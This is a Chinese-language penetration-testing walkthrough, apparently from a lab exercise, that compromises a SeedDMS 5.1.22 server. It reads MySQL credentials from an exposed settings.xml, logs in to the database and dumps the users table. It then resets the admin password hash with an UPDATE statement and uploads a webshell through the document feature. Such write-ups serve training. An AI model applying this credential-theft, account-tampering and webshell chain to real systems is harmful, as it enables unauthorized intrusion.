## **2、渗透测试**

### **2.1 WEB渗透**

#### **1.爆破信息泄露**

访问站点首页未发现有用信息

![](../Images/daf75a8c63eb3297ab7157ff45a98132.png)

通过JS页面中提示访问隐藏页面

![](../Images/040cbe6824922074a9cfa71407f4e0c4.png)

搜索CMS相关漏洞,由于使用的版本为5.1.22不存在漏洞

```
searchsploit seeddms
```

![](../Images/dfce4c76bdde4b329e79cf3d2b0e4274.png)

#### **2.查看CMS源代码**

根据代码提示存在setting.xml文件

```
https://sourceforge.net/p/seeddms/code/ci/5.1.22/tree/conf/.htaccess#l1
```

![](../Images/4fce0389d50d1811c2bc8f8fb20bb317.png)

在配置文件中获取到mysql的账号和密码

```
http://192.168.207.145/seeddms51x/conf/settings.xml
```

![](../Images/ec508fee08ea303550481ffed4842bb4.png)

#### **3.连接MySQL收集**

```
mysql -h 192.168.207.145 -u seeddms -pseeddms
```

![](../Images/963dfd4e9f80503c48bdb601677853ee.png)

查看本地数据账号和密码信息

```

use seeddms;
```

![](../Images/cd1eea1e009d83b61d84bcc6fbf5fb70.png)

在用户表中获取到另外一个账号和密码

```
select \* from users;
```

![](../Images/17aaa8c70b6ba37e36871689587bc045.png)

更新当前admin账号的密码为admin

```
UPDATE tblUsers SET pwd='21232f297a57a5a743894a0e4a801fc3' WHERE login='admin';
```

![](../Images/5437cfd24edb58660624a6b0ab16087c.png)

#### **4.上传webshell**

使用更新后的账号和密码进行登录

![](../Images/d6ef93255510d57b7a458a7d1f24db27.png)

在添加文档中上传webshell

![](../Images/d897016e446ea5e35b2b0e5879f8a5fb.png)

上传完毕后查看文件的ID值

![](../Images/2ad4483683ae00f18c1c1c610d901996.png)

按照如下路径进行访问

```
http://192.168.207.145/seeddms51x/data/1048576/6/1.php
```

![](../Images/33071f7bbb14c55338e6c25683c49a82.png)
